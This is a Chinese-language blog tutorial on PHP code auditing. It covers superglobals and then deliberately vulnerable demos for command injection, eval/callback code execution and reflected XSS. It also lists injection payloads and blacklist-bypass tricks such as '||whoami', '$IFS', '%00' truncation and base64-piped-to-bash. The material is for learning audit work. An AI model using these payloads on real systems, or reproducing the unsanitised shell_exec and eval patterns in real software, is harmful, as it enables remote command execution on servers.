      <a  href="/2021/10/24/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-1/" class="article-date">
      <time datetime="2021-10-24T02:26:22.000Z" itemprop="datePublished">2021-10-24</time>
</a>

    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a  class="article-title" href="/2021/10/24/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-1/">PHP代码审计学习-1</a>
    </h1>
  


      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h4 id="审计时可能会涉及到的超全局变量"><a href="#审计时可能会涉及到的超全局变量" class="headerlink" title="审计时可能会涉及到的超全局变量"></a>审计时可能会涉及到的超全局变量</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$GLOBALS</span>;</span><br><span class="line"><span class="variable">$_SERVER</span>;</span><br><span class="line"><span class="variable">$_REQUEST</span>;</span><br><span class="line"><span class="variable">$_POST</span>;</span><br><span class="line"><span class="variable">$_GET</span>;</span><br><span class="line"><span class="variable">$_FILES</span>;</span><br><span class="line"><span class="variable">$_ENV</span>;</span><br><span class="line"><span class="variable">$_COOKIE</span>;</span><br><span class="line"><span class="variable">$_SESSION</span></span><br><span class="line">    </span><br></pre></td></tr></table></figure>

<h4 id="各个变量作用说明"><a href="#各个变量作用说明" class="headerlink" title="各个变量作用说明"></a>各个变量作用说明</h4><p>(1) $GLOBALS 引用全局作用域中可用的全部变量</p>
<p>在一个php脚本的全部作用域全都可以访问到，$GLOBALS是一个包含了全部变量的全局组合数组。变量的名字就是数组的键。</p>
<p>(2) $_SERVER</p>
<p>是一个包含了诸如头信息（header）、路径(path)、以及脚本位置(script locations) 等等信息的数组。这个数组中的项目由web服务器创建。不能保证每个服务器都会提供给我们完整的信息；服务器可能会忽略一些，也可能会提供一些没有列举在此处的信息给我们。</p>
<p>以下列出了所有$_SERVER变量中的重要元素：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>] <span class="comment">#当前正在执行 脚本的文件名，与 document root相关。</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>] <span class="comment">#传递给该 脚本的参数。</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;argc&#x27;</span>] <span class="comment">#包含传递给程序的 命令行参数的个数（如果运行在命令行模式）。</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;GATEWAY_INTERFACE&#x27;</span>] <span class="comment">#服务器使用的 CGI 规范的版本。例如，“CGI/1.1”。</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;SERVER_NAME&#x27;</span>] <span class="comment">#当前 运行脚本所在服务器 主机的名称。</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;SERVER_SOFTWARE&#x27;</span>] <span class="comment">#服务器标识的字串，在响应请求时的头部中给出。</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;SERVER_PROTOCOL&#x27;</span>] <span class="comment">#请求页面时通信协议的名称和版本。例如，“HTTP/1.0”。</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] <span class="comment">#访问页面时的请求方法。例如：“GET”、“HEAD”，“POST”，“PUT”。</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>] <span class="comment">#查询(query)的字符串。</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;DOCUMENT_ROOT&#x27;</span>] <span class="comment">#当前 运行脚本所在的文档根目录。在服务器配置文件中定义。</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_ACCEPT&#x27;</span>] <span class="comment">#当前请求的 Accept: 头部的内容。</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_ACCEPT_CHARSET&#x27;</span>] <span class="comment">#当前请求的 Accept-Charset: 头部的内容。例如：“iso-8859-1,*,utf-8”。</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_ACCEPT_ENCODING&#x27;</span>] <span class="comment">#当前请求的 Accept-Encoding: 头部的内容。例如：“gzip”。</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_ACCEPT_LANGUAGE&#x27;</span>]<span class="comment">#当前请求的 Accept-Language: 头部的内容。例如：“en”。</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_CONNECTION&#x27;</span>] <span class="comment">#当前请求的 Connection: 头部的内容。例如：“Keep-Alive”。</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_HOST&#x27;</span>] <span class="comment">#当前请求的 Host: 头部的内容。</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27; HTTP_REFERER&#x27;</span>] <span class="comment">#链接到当前页面的前一页面的 URL 地址。</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27; HTTP_USER_AGENT&#x27;</span>] <span class="comment">#当前请求的 User-Agent: 头部的内容。</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTPS&#x27;</span>] — 如果通过https访问,则被设为一个非空的值(on)，否则返回off</span><br><span class="line"> </span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] <span class="comment">#正在浏览当前页面用户的 IP 地址。</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_HOST&#x27;</span>] <span class="comment">#正在浏览当前页面用户的 主机名。</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_PORT&#x27;</span>] <span class="comment">#用户连接到服务器时所使用的端口。</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;SCRIPT_FILENAME&#x27;</span>] <span class="comment">#当前执行 脚本的 绝对路径名。</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;SERVER_ADMIN&#x27;</span>] <span class="comment"># 管理员信息</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;SERVER_PORT&#x27;</span>] <span class="comment">#服务器所使用的端口</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;SERVER_SIGNATURE&#x27;</span>] <span class="comment">#包含服务器版本和 虚拟主机名的字符串。</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;PATH_TRANSLATED&#x27;</span>] <span class="comment">#当前 脚本所在文件系统（不是文档根目录）的基本路径。</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;SCRIPT_NAME&#x27;</span>] <span class="comment">#包含当前 脚本的路径。这在页面需要指向自己时非常有用。</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>] <span class="comment">#访问此页面所需的 URI。例如，“/index.html”</span></span><br></pre></td></tr></table></figure>

<p>(3) $_REQUEST</p>
<p>用于收集HTML当中提交的数据，无论$_GET、$_POST或其他方式均可接受到，我们可以用$_REQUEST来收集表单中所提交的信息。</p>
<p>(4) $_POST</p>
<p>应用于提交表单，或复杂信息。</p>
<p>(5) $_GET</p>
<p>可用于提交表单，或提交简单信息于服务器，可在<form method="GET">处设置</form></p>
<p>(6) $_FILES</p>
<p>获取文件 </p>
<p>演示代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;heade&gt;</span><br><span class="line"></span><br><span class="line">&lt;/heade&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form action=<span class="string">&quot;global.php&quot;</span> method=<span class="string">&quot;post&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;fileupload&quot;</span>/&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;send file&quot;</span>&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># $GLOBALS 引用全局作用域中可用的全部变量</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$foo</span> = <span class="string">&quot;local variable&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;$foo in global scope: &#x27;</span>.<span class="variable">$GLOBALS</span>[<span class="string">&#x27;foo&#x27;</span>].<span class="string">&quot;\r\n&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;$foo in local scope: &#x27;</span>.<span class="variable">$foo</span>.<span class="string">&quot;\r\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$foo</span> = <span class="string">&quot;globals variable&quot;</span>;</span><br><span class="line"><span class="comment">#此处可以见得，由$AGLOBALS调用的foo变量是全局变量</span></span><br><span class="line"><span class="comment">#在foo函数内直接调用的$foo变量是局部变量</span></span><br><span class="line">foo();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#利用var_dump递归的打印$_SERVER中存储的服务器信息</span></span><br><span class="line"><span class="comment">#var_dump($_SERVER);</span></span><br><span class="line"><span class="comment">#打印输出当前php文件在服务器上的根目录</span></span><br><span class="line"></span><br><span class="line">print_r(<span class="string">&#x27;PATH_TRANSLATED:&#x27;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;PATH_TRANSLATED&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;$_GET[a]:&#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>].<span class="string">&quot;\r\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;$_POST[b]:&#x27;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>].<span class="string">&quot;\r\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;$_REQUEST[c]:&#x27;</span>.<span class="variable">$_REQUEST</span>[<span class="string">&#x27;c&#x27;</span>].<span class="string">&quot;\r\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#$_FILES 是一个预定义数组，用来获取通过POST方式上传文件的相关信息。如果为单个文件单独上传，那么$_FILES 为二维数组；如果为多个文件上传，那么￥FILES为三维数组</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#拿到上传文件进行打印</span></span><br><span class="line">print_r(<span class="variable">$_FILES</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/images/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0(1).assets/image-20211024111608484.png" alt="image-20211024111608484"></p>
<p><img src="/images/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0(1).assets/image-20211024111557690.png" alt="image-20211024111557690"></p>
<h4 id="简单命令执行漏洞分析"><a href="#简单命令执行漏洞分析" class="headerlink" title="简单命令执行漏洞分析"></a>简单命令执行漏洞分析</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$target</span>=<span class="variable">$_REQUEST</span>[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line">    <span class="variable">$cmd</span> = shell_exec(<span class="string">&#x27;ping &#x27;</span>.<span class="variable">$target</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="常见php命令执行函数"><a href="#常见php命令执行函数" class="headerlink" title="常见php命令执行函数"></a>常见php命令执行函数</h5><p>exec()、 system() 、popen()、passthru()、proc_open()、pcntl_exec()、shell_exec()、反引号` 实际上是使用shell_exec()函数</p>
<p>system()输出并返回最后一行shell的结果</p>
<p>exec()不输出结果，返回最后一行shell的结果，所有结果可以保存到一个返回的数组里。</p>
<p>passthru() 只调用命令，把命令的运行结果原封不动的输出到标准输出设备上</p>
<p>popen()、proc_open() 不会直接返回执行结果、而是返回一个文件指针</p>
<h5 id="漏洞利用以及绕过姿势："><a href="#漏洞利用以及绕过姿势：" class="headerlink" title="漏洞利用以及绕过姿势："></a>漏洞利用以及绕过姿势：</h5><p>各种逻辑运算符</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">| 将前者的执行结果作为参数交给后者进行执行</span><br><span class="line">|| 前面出错执行后面的 ping xxx||whoami</span><br><span class="line">&amp; 前面为真为假不影响后面命令的执行</span><br><span class="line">&amp;&amp; 前面的为假后面的不执行，前面只可为真。</span><br><span class="line">        </span><br></pre></td></tr></table></figure>

<p><strong>针对空格过滤:</strong></p>
<blockquote>
<p>$IFS绕过 </p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls$IFS-la</span><br></pre></td></tr></table></figure>

<p><img src="/images/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0(1).assets/image-20211024135433323.png" alt="image-20211024135433323"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;或者&lt;&gt;绕过</span><br><span class="line">cat&gt;test.sql</span><br><span class="line">cat&lt;&gt;test.sql</span><br></pre></td></tr></table></figure>

<blockquote>
<p>php环境下(%09)</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat%09test.sql</span><br></pre></td></tr></table></figure>

<p><strong>消除后缀的影响</strong></p>
<p>例如</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$target</span>=<span class="variable">$_REQUEST</span>[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line">    <span class="variable">$cmd</span> = shell_exec(<span class="string">&#x27;ping &#x27;</span>.<span class="variable">$target</span>.<span class="string">&#x27;.com&#x27;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>执行命令时虽没有任何过滤，但会在我们输入的命令后拼接上.com，如果我们不做处理的话，执行的命令将会失去我们原来的含义，因此，我们要提前将后面的尾缀(.com)截断</p>
<blockquote>
<p>%00截断</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wadwad|whoami%<span class="number">00</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0(1).assets/image-20211024140510347.png" alt="image-20211024140510347"></p>
<blockquote>
<p>%20%23</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Wdad|ls%<span class="number">20</span>%<span class="number">23</span> <span class="comment">#也就是空格# 将后面的字符注释掉</span></span><br></pre></td></tr></table></figure>

<p><strong>黑名单绕过</strong></p>
<blockquote>
<p>拼接字符</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=c;b=at;c=test.sql;$a<span class="variable">$b</span> <span class="variable">$c</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>编码绕过</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wad |echo &#x27;d2hvYW1p&#x27;|base64 -d |bash</span><br></pre></td></tr></table></figure>

<blockquote>
<p>单双引号</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat test.sql</span><br><span class="line">c<span class="string">&#x27;&#x27;</span>a<span class="string">&#x27;&#x27;</span>t tes<span class="string">&quot;&quot;</span>t.sql</span><br></pre></td></tr></table></figure>

<blockquote>
<p>反斜杠利用</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat test.sql</span><br><span class="line">c\a\t te\s\t.sql</span><br></pre></td></tr></table></figure>

<blockquote>
<p>通配符绕过黑名单限制</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">一个?代表一个字符，*代表若干字符</span><br><span class="line">/bin/cat test.sql</span><br><span class="line">/bin/c?t tes?.sq? #会输出许多内容，其中包括test.sql的内容</span><br></pre></td></tr></table></figure>

<h4 id="代码执行漏洞"><a href="#代码执行漏洞" class="headerlink" title="代码执行漏洞"></a>代码执行漏洞</h4><h5 id="常见危险函数-assert与eval"><a href="#常见危险函数-assert与eval" class="headerlink" title="常见危险函数(assert与eval)"></a>常见危险函数(assert与eval)</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line">   <span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">   print_r(<span class="variable">$cmd</span>);</span><br><span class="line">   <span class="keyword">eval</span>(<span class="string">&quot;\$cmd = <span class="subst">$cmd</span>&quot;</span>);<span class="comment">//assret()函数也是一样的，这里没对用户输入做过滤</span></span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;ok&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;not&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="常见回调函数"><a href="#常见回调函数" class="headerlink" title="常见回调函数"></a>常见回调函数</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">常用回调函数有： </span><br><span class="line">call_user_func(evil,<span class="variable">$cmd</span>);	<span class="comment">#第一个参数是会回调函数 第二个参数视为回调函数的参数</span></span><br><span class="line">call_user_func_array(evil,<span class="keyword">array</span>(<span class="variable">$cmd</span>)); <span class="comment">#第一个参数视为回调函数 第二个参数`数组`视为回调函数的参数</span></span><br><span class="line">array_map(evil,<span class="keyword">array</span>(<span class="variable">$cmd</span>)); <span class="comment">#第一个参数视为回调函数 第二个参数`数组`视为回调函数的参数</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#call_user_func(callable $callback , mixed $Parameter，mixed $xxx)</span></span><br><span class="line"><span class="comment">#第一个参数$callback是被调用的回调函数，剩下的参数是回调函数的参数</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#写一个回调函数小demo</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">evil</span>(<span class="params"><span class="variable">$Parameter</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> (<span class="variable">$Parameter</span>.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$Parameter</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">call_user_func(evil,<span class="variable">$cmd</span>);</span><br></pre></td></tr></table></figure>

<p><img src="/images/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0(1).assets/image-20211024144125269.png" alt="image-20211024144125269"></p>
<h5 id="动态执行函数"><a href="#动态执行函数" class="headerlink" title="动态执行函数"></a>动态执行函数</h5><p>定义一个函数，将想要调用的变量名赋值给字符串，使用变量名代替函数名动态调用函数。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#需求： 写一个利用字符串来调用exec的函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Callme</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$Parameter1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$Parameter2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    <span class="variable">$Parameter1</span>(<span class="variable">$Parameter2</span>);</span><br><span class="line">&#125;</span><br><span class="line">Callme();</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>​    </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">#利用回调函数执行命令</span><br><span class="line">call_user_func_array($_GET[&#x27;name&#x27;],array($_GET[&#x27;cmd&#x27;]));</span><br></pre></td></tr></table></figure>

<p><img src="/images/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0(1).assets/image-20211024150119435.png" alt="image-20211024150119435"></p>
<h5 id="preg-relpace函数："><a href="#preg-relpace函数：" class="headerlink" title="preg_relpace函数："></a>preg_relpace函数：</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> preg_replace(</span><br><span class="line">    <span class="keyword">string</span>|<span class="keyword">array</span> <span class="variable">$pattern</span>,</span><br><span class="line">    <span class="keyword">string</span>|<span class="keyword">array</span> <span class="variable">$replacement</span>,</span><br><span class="line">    <span class="keyword">string</span>|<span class="keyword">array</span> <span class="variable">$subject</span>,</span><br><span class="line">    <span class="keyword">int</span> <span class="variable">$limit</span> = -<span class="number">1</span>,</span><br><span class="line">    <span class="keyword">int</span> &amp;<span class="variable">$count</span> = <span class="literal">null</span></span><br><span class="line">): <span class="keyword">string</span>|<span class="keyword">array</span>|<span class="literal">null</span></span><br></pre></td></tr></table></figure>

<p>函数可根据pattern来匹配subject符合条件的部分，并且将其提花能成replacement中的字符</p>
<h4 id="XSS漏洞"><a href="#XSS漏洞" class="headerlink" title="XSS漏洞"></a>XSS漏洞</h4><h5 id="反射性"><a href="#反射性" class="headerlink" title="反射性"></a>反射性</h5><p>demo:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$_GET</span>[<span class="string">&#x27;xss&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>没有任何的过滤拦截，在GET请求输入xss代码，于页面打印并执行，形成xss漏洞。</p>
